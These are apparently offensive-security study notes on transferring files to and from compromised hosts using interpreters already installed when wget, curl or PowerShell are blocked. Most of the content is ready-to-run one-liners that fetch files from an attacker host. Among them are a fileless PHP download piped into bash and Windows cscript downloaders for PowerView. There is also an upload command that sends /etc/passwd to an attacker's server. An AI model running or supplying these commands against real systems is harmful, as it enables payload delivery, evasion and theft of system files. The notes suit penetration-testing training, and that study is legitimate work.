# Transferring Files with Code

## Key Concept

When standard tools (wget, curl, PowerShell) are blocked, **programming languages already on the system** can download/upload files using one-liners.

---

## DOWNLOAD One-liners

### Python

```bash
# Python 3
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://IP/file.sh", "file.sh")'

# Python 2.7
python2.7 -c 'import urllib;urllib.urlretrieve("https://IP/file.sh", "file.sh")'
```

### PHP (3 methods)

```bash
# Method 1: file_get_contents + file_put_contents
php -r '$file = file_get_contents("https://IP/file.sh"); file_put_contents("file.sh",$file);'

# Method 2: fopen (buffered read — better for large files)
php -r 'const BUFFER = 1024; $fremote = fopen("https://IP/file.sh","rb"); $flocal = fopen("file.sh","wb"); while ($buffer = fread($fremote,BUFFER)){fwrite($flocal,$buffer);} fclose($flocal); fclose($fremote);'

# Method 3: Fileless — pipe to bash
php -r '$lines = @file("https://IP/file.sh"); foreach ($lines as $line_num => $line){echo $line;}' | bash
```

### Ruby

```bash
ruby -e 'require "net/http"; File.write("file.sh", Net::HTTP.get(URI.parse("https://IP/file.sh")))'
```

### Perl

```bash
perl -e 'use LWP::Simple; getstore("https://IP/file.sh", "file.sh");'
```

### JavaScript (Windows only — cscript)

```jsx
// Save as wget.js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

```bash
cscript.exe /nologo wget.js https://IP/PowerView.ps1 PowerView.ps1
```

### VBScript (Windows only — cscript)

```
' Save as wget.vbs
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

```bash
cscript.exe /nologo wget.vbs https://IP/PowerView.ps1 PowerView.ps1
```

---

## UPLOAD One-liners

### Python3 (requests module)

```bash
# Attacker: start upload server
python3 -m uploadserver

# Target: upload file (one-liner)
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

Expanded for readability:

```python
import requests
URL = "http://192.168.49.128:8000/upload"
file = open("/etc/passwd", "rb")
r = requests.post(URL, files={"files": file})
```

---

## Quick Reference — Language Availability

| Language | Linux | Windows | One-liner flag |
| --- | --- | --- | --- |
| Python3 | ✅ Common | Rare | `-c` |
| Python2.7 | Legacy systems | Rare | `-c` |
| PHP | ✅ Web servers | Rare | `-r` |
| Ruby | Sometimes | Rare | `-e` |
| Perl | Sometimes | Rare | `-e` |
| JavaScript (cscript) | ❌ | ✅ Default | Via `.js` file |
| VBScript (cscript) | ❌ | ✅ Win98+ | Via `.vbs` file |

---

## Key Takeaways

- PHP is on **77%+ of web servers** → almost always available on compromised web hosts
- Python, Ruby, Perl all use `e` or `c` for one-liners → no file needed
- JS + VBScript via `cscript.exe` = **Windows-native** fallback when PowerShell is blocked
- PHP fileless pipe (`| bash`) = execute without writing to disk
- When building custom upload scripts, **Python `requests`** module is the cleanest approach